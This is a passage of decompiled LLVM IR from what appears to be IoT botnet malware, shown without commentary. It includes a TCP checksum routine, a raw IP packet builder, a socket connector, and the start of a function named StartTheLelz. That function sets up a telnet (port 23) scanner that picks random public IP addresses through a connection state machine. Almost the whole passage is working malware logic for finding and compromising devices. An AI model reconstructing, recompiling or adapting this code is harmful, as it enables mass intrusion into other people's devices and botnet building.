  %v5_abf0 = inttoptr i32 %v1_abec to i8*
  %v1_abf8 = add nsw i32 %stack_var_-36.011, -2
  %v8_ac08 = icmp sgt i32 %v1_abf8, 1
  br i1 %v8_ac08, label %dec_label_pc_abb8, label %dec_label_pc_ac0c

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_abb8, %entry
  %v2_ac2c = phi i32 [ 0, %entry ], [ %v2_abd8, %dec_label_pc_abb8 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_abf0, %dec_label_pc_abb8 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_abdc, %dec_label_pc_abb8 ]
  %v7_ac04.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_abf8, %dec_label_pc_abb8 ]
  %v7_ac04.lcssa = icmp eq i32 %v7_ac04.lcssa.in, 1
  br i1 %v7_ac04.lcssa, label %dec_label_pc_ac18, label %dec_label_pc_ac94.preheader

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ac0c
  %v2_ac1c = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_ac1c = zext i8 %v2_ac1c to i32
  %v2_ac30 = add i32 %v3_ac1c, %v2_ac2c
  %v3_ac30 = icmp ult i32 %v2_ac30, %v2_ac2c
  %v4_ac34 = zext i1 %v3_ac30 to i32
  %v5_ac34 = add i32 %v4_ac34, %stack_var_-40.0.lcssa
  br label %dec_label_pc_ac94.preheader

dec_label_pc_ac94.preheader:                      ; preds = %dec_label_pc_ac18, %dec_label_pc_ac0c
  %v3_acc0.ph = phi i32 [ %v2_ac2c, %dec_label_pc_ac0c ], [ %v2_ac30, %dec_label_pc_ac18 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_ac0c ], [ %v5_ac34, %dec_label_pc_ac18 ]
  %v3_ac9836 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_aca037 = udiv i32 %v3_acc0.ph, 65536
  %v2_aca438 = or i32 %v3_ac9836, %v3_aca037
  %v3_acac39 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_acb440 = or i32 %v2_aca438, %v3_acac39
  %v2_acb841 = icmp eq i32 %v2_acb440, 0
  br i1 %v2_acb841, label %dec_label_pc_acc0, label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac94.preheader, %dec_label_pc_ac44
  %v3_acac44 = phi i32 [ %v3_acac, %dec_label_pc_ac44 ], [ %v3_acac39, %dec_label_pc_ac94.preheader ]
  %v2_aca443 = phi i32 [ %v2_aca4, %dec_label_pc_ac44 ], [ %v2_aca438, %dec_label_pc_ac94.preheader ]
  %v3_acc042 = phi i32 [ %v2_ac84, %dec_label_pc_ac44 ], [ %v3_acc0.ph, %dec_label_pc_ac94.preheader ]
  %v2_ac58 = urem i32 %v3_acc042, 65536
  %v2_ac84 = add i32 %v2_aca443, %v2_ac58
  %v3_ac84 = icmp ult i32 %v2_ac84, %v2_ac58
  %v4_ac88 = zext i1 %v3_ac84 to i32
  %v5_ac88 = add nuw nsw i32 %v4_ac88, %v3_acac44
  %v3_ac98 = mul i32 %v5_ac88, 65536
  %v3_aca0 = udiv i32 %v2_ac84, 65536
  %v2_aca4 = or i32 %v3_ac98, %v3_aca0
  %v3_acac = udiv i32 %v5_ac88, 65536
  %v2_acb4 = or i32 %v2_aca4, %v3_acac
  %v2_acb8 = icmp eq i32 %v2_acb4, 0
  br i1 %v2_acb8, label %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge, label %dec_label_pc_ac44

dec_label_pc_ac94.dec_label_pc_acc0_crit_edge:    ; preds = %dec_label_pc_ac44
  br label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge, %dec_label_pc_ac94.preheader
  %v3_acc0.lcssa = phi i32 [ %v2_ac84, %dec_label_pc_ac94.dec_label_pc_acc0_crit_edge ], [ %v3_acc0.ph, %dec_label_pc_ac94.preheader ]
  %v1_accc = urem i32 %v3_acc0.lcssa, 65536
  %v3_acd4 = xor i32 %v1_accc, 65535
  ret i32 %v3_acd4

; uselistorder directives
  uselistorder i32 %v2_aca4, { 1, 0 }
  uselistorder i32 %v5_ac88, { 1, 0 }
  uselistorder i32 %v2_ac84, { 2, 0, 3, 1 }
  uselistorder i32 %v3_acac39, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_acc0.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ac2c, { 0, 2, 1 }
  uselistorder i32 %v1_abf8, { 0, 2, 1 }
  uselistorder i32 %v2_abd8, { 0, 2, 1 }
  uselistorder i32 %v2_abd4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 1, 0 }
  uselistorder label %dec_label_pc_abb8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_ace8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_ad20 = add i32 %arg1, 12
  %v2_ad20 = inttoptr i32 %v1_ad20 to i32*
  %v3_ad20 = load i32, i32* %v2_ad20, align 4
  store i32 %v3_ad20, i32* %stack_var_-44, align 4
  %v1_ad48 = call i32 @htons(i32 20)
  %v1_ad6c = call i32 @malloc(i32 32)
  %v2_ad7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_ad6c, i32* @r0, align 4
  store i32 %v2_ad7c, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ad90 = call i32 @memcpy()
  %v1_ad98 = add i32 %v1_ad6c, 12
  %v3_ad9c = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_ad98, i32* @r0, align 4
  store i32 %v3_ad9c, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_adb0 = call i32 @memcpy()
  %v2_adbc = inttoptr i32 %v1_ad6c to i8*
  %v3_adbc = call i32 @csum(i8* %v2_adbc, i32 32)
  %sext2 = mul i32 %v3_adbc, 16777216
  %v3_adc8 = ashr i32 %sext2, 31
  store i32 %v1_ad6c, i32* @r0, align 4
  %v0_add4 = call i32 @free()
  %v3_addc = sdiv i32 %sext2, 16777216
  %v4_ade0 = mul nsw i32 %v3_adc8, 256
  %v4_ade4 = and i32 %v4_ade0, 65280
  %v5_ade4 = or i32 %v4_ade4, %v3_addc
  store i32 %v3_ace8, i32* @fp, align 4
  ret i32 %v5_ade4

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_ad6c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_adf8 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_ae18 = load i8, i8* %arg1, align 1
  %v4_ae20 = zext i8 %v2_ae18 to i32
  %v1_ae24 = and i32 %v4_ae20, 240
  %v1_ae28 = or i32 %v1_ae24, 5
  store i32 %v1_ae28, i32* %r3.global-to-local, align 4
  %v1_ae34 = trunc i32 %v1_ae28 to i8
  store i8 %v1_ae34, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ae64 = add i32 %tmp4, 1
  %v4_ae64 = inttoptr i32 %v3_ae64 to i8*
  store i8 0, i8* %v4_ae64, align 1
  %v3_ae68 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ae68, 20
  %v3_ae7c = urem i32 %fold, 65536
  store i32 %v3_ae7c, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_ae84 = trunc i32 %fold to i8
  %v3_ae84 = add i32 %tmp4, 2
  %v4_ae84 = inttoptr i32 %v3_ae84 to i8*
  store i8 %v1_ae84, i8* %v4_ae84, align 1
  %v0_ae88 = load i32, i32* %r3.global-to-local, align 4
  %v3_ae88 = sdiv i32 %v0_ae88, 256
  store i32 %v3_ae88, i32* %r3.global-to-local, align 4
  %v1_ae8c = trunc i32 %v3_ae88 to i8
  %v2_ae8c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae8c = add i32 %v2_ae8c, 3
  %v4_ae8c = inttoptr i32 %v3_ae8c to i8*
  store i8 %v1_ae8c, i8* %v4_ae8c, align 1
  %v0_ae90 = call i32 @rand_cmwc()
  %v3_ae9c = urem i32 %v0_ae90, 65536
  store i32 %v3_ae9c, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_aea4 = trunc i32 %v0_ae90 to i8
  %v3_aea4 = add i32 %tmp4, 4
  %v4_aea4 = inttoptr i32 %v3_aea4 to i8*
  store i8 %v1_aea4, i8* %v4_aea4, align 1
  %v0_aea8 = load i32, i32* %r3.global-to-local, align 4
  %v3_aea83 = udiv i32 %v0_aea8, 256
  %v1_aeac = trunc i32 %v3_aea83 to i8
  %v2_aeac = load i32, i32* %r2.global-to-local, align 4
  %v3_aeac = add i32 %v2_aeac, 5
  %v4_aeac = inttoptr i32 %v3_aeac to i8*
  store i8 %v1_aeac, i8* %v4_aeac, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aeb8 = add i32 %tmp4, 6
  %v4_aeb8 = inttoptr i32 %v3_aeb8 to i8*
  store i8 0, i8* %v4_aeb8, align 1
  %v0_aebc = load i32, i32* %r3.global-to-local, align 4
  %v1_aebc = trunc i32 %v0_aebc to i8
  %v2_aebc = load i32, i32* %r2.global-to-local, align 4
  %v3_aebc = add i32 %v2_aebc, 7
  %v4_aebc = inttoptr i32 %v3_aebc to i8*
  store i8 %v1_aebc, i8* %v4_aebc, align 1
  %v3_aec8 = add i32 %tmp4, 8
  %v4_aec8 = inttoptr i32 %v3_aec8 to i8*
  store i8 -1, i8* %v4_aec8, align 1
  %v3_aed4 = add i32 %tmp4, 9
  %v4_aed4 = inttoptr i32 %v3_aed4 to i8*
  store i8 %tmp, i8* %v4_aed4, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aee0 = add i32 %tmp4, 10
  %v4_aee0 = inttoptr i32 %v3_aee0 to i8*
  store i8 0, i8* %v4_aee0, align 1
  %v0_aee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_aee4 = trunc i32 %v0_aee4 to i8
  %v2_aee4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aee4 = add i32 %v2_aee4, 11
  %v4_aee4 = inttoptr i32 %v3_aee4 to i8*
  store i8 %v1_aee4, i8* %v4_aee4, align 1
  %v2_aef0 = add i32 %tmp4, 12
  %v3_aef0 = inttoptr i32 %v2_aef0 to i32*
  store i32 %arg3, i32* %v3_aef0, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_aefc = add i32 %tmp4, 16
  %v3_aefc = inttoptr i32 %v2_aefc to i32*
  store i32 %arg2, i32* %v3_aefc, align 4
  store i32 %v3_adf8, i32* @fp, align 4
  ret i32 %v0_ae90

; uselistorder directives
  uselistorder i32 %v0_ae90, { 1, 2, 0 }
  uselistorder i32 %v3_ae88, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_af24 = icmp sgt i32 %arg1, 2
  br i1 %v8_af24, label %dec_label_pc_af34, label %dec_label_pc_af44

dec_label_pc_af34:                                ; preds = %entry
  %v1_af38 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %entry, %dec_label_pc_af34
  %storemerge1 = phi i32 [ 0, %dec_label_pc_af34 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_af44, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af58 = load i32, i32* @fp, align 4
  store i32 44896, i32* %stack_var_-4, align 4
  %v2_af5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af5c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_af84 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_af94 = icmp eq i32 %v1_af84, 0
  br i1 %v2_af94, label %dec_label_pc_af9c, label %dec_label_pc_afa8

dec_label_pc_af9c:                                ; preds = %entry
  br label %dec_label_pc_b090

dec_label_pc_afa8:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_afac = add i32 %v1_af84, 16
  %v2_afac = inttoptr i32 %v1_afac to i32*
  %v3_afac = load i32, i32* %v2_afac, align 4
  %v1_afb0 = inttoptr i32 %v3_afac to i32*
  %v2_afb0 = load i32, i32* %v1_afb0, align 4
  %v1_afb8 = add i32 %v1_af84, 12
  %v2_afb8 = inttoptr i32 %v1_afb8 to i32*
  %v3_afb8 = load i32, i32* %v2_afb8, align 4
  store i32 %v3_afb8, i32* @r2, align 4
  %v2_afc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afd0 = call i32 @bcopy(i32 %v2_afb0, i32 %v2_afc4, i32 %v3_afb8)
  %v1_afe8 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_b018 = call i32 @socket()
  %v6_b040 = call i32 @__GI_setsockopt(i32 %v0_b018, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_b048 = icmp eq i32 %v0_b018, -1
  br i1 %v3_b048, label %dec_label_pc_b050, label %dec_label_pc_b05c

dec_label_pc_b050:                                ; preds = %dec_label_pc_afa8
  br label %dec_label_pc_b090

dec_label_pc_b05c:                                ; preds = %dec_label_pc_afa8
  %v3_b06c = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_b06c = call i32 @__libc_connect(i32 %v0_b018, %sockaddr* %v3_b06c, i32 16)
  %v3_b074 = icmp eq i32 %v4_b06c, -1
  br i1 %v3_b074, label %dec_label_pc_b07c, label %dec_label_pc_b088

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b05c
  br label %dec_label_pc_b090

dec_label_pc_b088:                                ; preds = %dec_label_pc_b05c
  br label %dec_label_pc_b090

dec_label_pc_b090:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_b050, %dec_label_pc_af9c, %dec_label_pc_b088
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_af9c ], [ 0, %dec_label_pc_b050 ], [ 0, %dec_label_pc_b07c ], [ %v0_b018, %dec_label_pc_b088 ]
  store i32 %v3_af58, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_b090, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b0a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b0a0, i32* %ip.global-to-local, align 4
  %v3_b0a4 = load i32, i32* @r4, align 4
  store i32 %v3_b0a4, i32* %stack_var_-24, align 4
  store i32 45228, i32* %stack_var_-4, align 4
  %v19_b0a4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b0a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0a8, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_b0c4 = call i32 @__GI_time(i32* null)
  store i32 %v2_b0c4, i32* %r3.global-to-local, align 4
  store i32 %v2_b0c4, i32* @r4, align 4
  %v0_b0d0 = call i32 @rand_cmwc()
  %v0_b0d8 = load i32, i32* @r4, align 4
  %v2_b0d8 = xor i32 %v0_b0d8, %v0_b0d0
  store i32 %v2_b0d8, i32* %r3.global-to-local, align 4
  %v1_b0e0 = call i32 @srand(i32 %v2_b0d8)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b0f8 = call i32 @htons(i32 23)
  %v2_b110 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_b110, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b12c = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_b154 = inttoptr i32 %v1_b12c to i8*
  %v3_b154 = call i32 @__GI_memset(i8* %v2_b154, i32 0)
  %v2_b164 = mul i32 %arg2, 28
  %v1_b168 = or i32 %v2_b164, 3
  %v1_b16c = add i32 %v1_b168, 3
  %v3_b170 = and i32 %v1_b16c, -4
  %v1_b178 = load i32, i32* @sp, align 4
  %v2_b178 = sub i32 %v1_b178, %v3_b170
  %v1_b188 = add i32 %v2_b178, 7
  %v3_b18c = and i32 %v1_b188, -4
  %v2_b1b0 = mul i32 %arg2, 5
  store i32 %v2_b1b0, i32* %r3.global-to-local, align 4
  store i32 %v2_b1b0, i32* @r2, align 4
  %v2_b1c4 = inttoptr i32 %v3_b18c to i8*
  %v3_b1c4 = call i32 @__GI_memset(i8* %v2_b1c4, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2a461 = icmp sgt i32 %arg2, 0
  br i1 %v5_b2a461, label %dec_label_pc_b1d4, label %dec_label_pc_b2a8

dec_label_pc_b1d4:                                ; preds = %entry, %dec_label_pc_b1d4
  %storemerge462 = phi i32 [ %v1_b290, %dec_label_pc_b1d4 ], [ 0, %entry ]
  %v2_b1e4 = mul i32 %storemerge462, 28
  %v2_b1e8 = add i32 %v2_b1e4, %v3_b18c
  store i32 %v2_b1e8, i32* %r3.global-to-local, align 4
  %v2_b1f0 = inttoptr i32 %v2_b1e8 to i32*
  store i32 0, i32* %v2_b1f0, align 4
  %v0_b1f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1f4 = add i32 %v0_b1f4, 4
  store i32 %v1_b1f4, i32* %r3.global-to-local, align 4
  %v2_b1fc = inttoptr i32 %v1_b1f4 to i32*
  store i32 0, i32* %v2_b1fc, align 4
  %v0_b200 = load i32, i32* %r3.global-to-local, align 4
  %v1_b200 = add i32 %v0_b200, 4
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v2_b208 = inttoptr i32 %v1_b200 to i32*
  store i32 0, i32* %v2_b208, align 4
  %v0_b20c = load i32, i32* %r3.global-to-local, align 4
  %v1_b20c = add i32 %v0_b20c, 4
  store i32 %v1_b20c, i32* %r3.global-to-local, align 4
  %v2_b214 = inttoptr i32 %v1_b20c to i32*
  store i32 0, i32* %v2_b214, align 4
  %v0_b218 = load i32, i32* %r3.global-to-local, align 4
  %v1_b218 = add i32 %v0_b218, 4
  store i32 %v1_b218, i32* %r3.global-to-local, align 4
  %v2_b220 = inttoptr i32 %v1_b218 to i32*
  store i32 0, i32* %v2_b220, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 4
  store i32 %v1_b224, i32* %r3.global-to-local, align 4
  %v2_b22c = inttoptr i32 %v1_b224 to i32*
  store i32 0, i32* %v2_b22c, align 4
  %v0_b230 = load i32, i32* %r3.global-to-local, align 4
  %v1_b230 = add i32 %v0_b230, 4
  %v2_b238 = inttoptr i32 %v1_b230 to i32*
  store i32 0, i32* %v2_b238, align 4
  %v3_b260 = add i32 %v2_b1e8, 9
  %v4_b260 = inttoptr i32 %v3_b260 to i8*
  store i8 1, i8* %v4_b260, align 1
  %v2_b280 = add i32 %v2_b1e8, 24
  %v2_b288 = inttoptr i32 %v2_b280 to i32*
  store i32 %v1_b12c, i32* %v2_b288, align 4
  %v1_b290 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_b290, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2a4 = icmp slt i32 %v1_b290, %arg2
  br i1 %v5_b2a4, label %dec_label_pc_b1d4, label %dec_label_pc_b2a8

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b1d4, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2a8
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b2a8 ], [ %v1_b2b4, %dec_label_pc_b2b0 ]
  %v1_b2b4 = add i32 %stack_var_-56.0, 1
  store i32 %v1_b2b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_23108.91 to i32), i32* %r3.global-to-local, align 4
  %v4_b2c4 = mul i32 %v1_b2b4, 4
  %v5_b2c4 = add i32 %v4_b2c4, ptrtoint ([10 x i8*]* @global_var_23108.91 to i32)
  %v6_b2c4 = inttoptr i32 %v5_b2c4 to i32*
  %v7_b2c4 = load i32, i32* %v6_b2c4, align 4
  store i32 %v7_b2c4, i32* %r3.global-to-local, align 4
  %v2_b2c8 = icmp eq i32 %v7_b2c4, 0
  br i1 %v2_b2c8, label %dec_label_pc_b2d0.preheader, label %dec_label_pc_b2b0

dec_label_pc_b2d0.preheader:                      ; preds = %dec_label_pc_b2b0
  %v2_b358 = add i32 %v3_b18c, 8
  %v2_b68c = add i32 %v3_b18c, 4
  %v3_b77c = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_b7ec = ptrtoint i32* %stack_var_-324 to i32
  %v2_b8e8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_b944 = ptrtoint i32* %stack_var_-340 to i32
  %v2_b948 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ba64 = add i32 %v3_b18c, 16
  %v2_bae0 = add i32 %v3_b18c, 24
  br label %dec_label_pc_b2d0

dec_label_pc_b2d0:                                ; preds = %dec_label_pc_b2d0, %dec_label_pc_c460, %dec_label_pc_b2d0.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_b2a461, label %dec_label_pc_b2dc, label %dec_label_pc_b2d0

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2d0, %dec_label_pc_c460
  %storemerge553 = phi i32 [ %v1_c464, %dec_label_pc_c460 ], [ 0, %dec_label_pc_b2d0 ]
  %v3_b2e8 = mul i32 %storemerge553, 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b2f0 = mul i32 %storemerge553, 28
  %v2_b2f4 = add i32 %v2_b2f0, %v3_b18c
  %v2_b2f8 = add i32 %v2_b2f4, 16
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v1_b2fc = inttoptr i32 %v2_b2f8 to i32*
  %v2_b2fc = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_b2fc, i32* %r3.global-to-local, align 4
  %v2_b300 = icmp eq i32 %v2_b2fc, 0
  br i1 %v2_b300, label %dec_label_pc_b308, label %dec_label_pc_b340

dec_label_pc_b308:                                ; preds = %dec_label_pc_b2dc
  store i32 %storemerge553, i32* @r4, align 4
  %v2_b310 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b324 = load i32, i32* @r4, align 4
  %v3_b328 = mul i32 %v0_b324, 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  %v2_b330 = mul i32 %v0_b324, 28
  %v2_b338 = add i32 %v2_ba64, %v2_b330
  store i32 %v2_b338, i32* %r3.global-to-local, align 4
  %v2_b33c = inttoptr i32 %v2_b338 to i32*
  store i32 %v2_b310, i32* %v2_b33c, align 4
  br label %dec_label_pc_b340

dec_label_pc_b340:                                ; preds = %dec_label_pc_b2dc, %dec_label_pc_b308
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b35c = add i32 %v2_b358, %v2_b2f0
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v1_b360 = inttoptr i32 %v2_b35c to i8*
  %v2_b360 = load i8, i8* %v1_b360, align 4
  %v3_b360 = sext i8 %v2_b360 to i32
  %v4_b360 = zext i8 %v2_b360 to i32
  store i32 %v4_b360, i32* %r3.global-to-local, align 4
  switch i32 %v3_b360, label %dec_label_pc_c460 [
    i32 0, label %dec_label_pc_b390
    i32 1, label %dec_label_pc_b800.lr.ph
    i32 2, label %dec_label_pc_baac
    i32 3, label %dec_label_pc_bbf8
    i32 4, label %dec_label_pc_bd4c
    i32 5, label %dec_label_pc_be98
    i32 6, label %dec_label_pc_bfec
    i32 7, label %dec_label_pc_c2f0
  ]

dec_label_pc_b390:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b3ac = add i32 %v2_b2f4, 8
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b3b0 = add i32 %v2_b2f4, 9
  %v2_b3b0 = inttoptr i32 %v1_b3b0 to i8*
  %v3_b3b0 = load i8, i8* %v2_b3b0, align 1
  %v7_b3b4 = icmp eq i8 %v3_b3b0, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_b3b4, label %dec_label_pc_b3bc, label %dec_label_pc_b4a8

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b390
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b3d8 = add i32 %v2_b2f4, 24
  store i32 %v2_b3d8, i32* %r3.global-to-local, align 4
  %v1_b3dc = inttoptr i32 %v2_b3d8 to i32*
  %v2_b3dc = load i32, i32* %v1_b3dc, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b400 = inttoptr i32 %v2_b2f4 to i32*
  store i32 0, i32* %v2_b400, align 4
  %v0_b404 = load i32, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v0_b404, 4
  store i32 %v1_b404, i32* %r3.global-to-local, align 4
  %v2_b40c = inttoptr i32 %v1_b404 to i32*
  store i32 0, i32* %v2_b40c, align 4
  %v0_b410 = load i32, i32* %r3.global-to-local, align 4
  %v1_b410 = add i32 %v0_b410, 4
  store i32 %v1_b410, i32* %r3.global-to-local, align 4
  %v2_b418 = inttoptr i32 %v1_b410 to i32*
  store i32 0, i32* %v2_b418, align 4
  %v0_b41c = load i32, i32* %r3.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 4
  store i32 %v1_b41c, i32* %r3.global-to-local, align 4
  %v2_b424 = inttoptr i32 %v1_b41c to i32*
  store i32 0, i32* %v2_b424, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = add i32 %v0_b428, 4
  store i32 %v1_b428, i32* %r3.global-to-local, align 4
  %v2_b430 = inttoptr i32 %v1_b428 to i32*
  store i32 0, i32* %v2_b430, align 4
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 4
  store i32 %v1_b434, i32* %r3.global-to-local, align 4
  %v2_b43c = inttoptr i32 %v1_b434 to i32*
  store i32 0, i32* %v2_b43c, align 4
  %v0_b440 = load i32, i32* %r3.global-to-local, align 4
  %v1_b440 = add i32 %v0_b440, 4
  %v2_b448 = inttoptr i32 %v1_b440 to i32*
  store i32 0, i32* %v2_b448, align 4
  store i32 %v2_b3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3dc, i32* %r3.global-to-local, align 4
  store i32 %v2_b3dc, i32* %v1_b3dc, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_b478 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b18c, i32 %v2_b3d8, i32 %v2_b3dc, i32 %v2_b3dc)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  %v3_b48c = mul i32 %v0_b488, 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b494 = mul i32 %v0_b488, 28
  %v2_b49c = add i32 %v2_b68c, %v2_b494
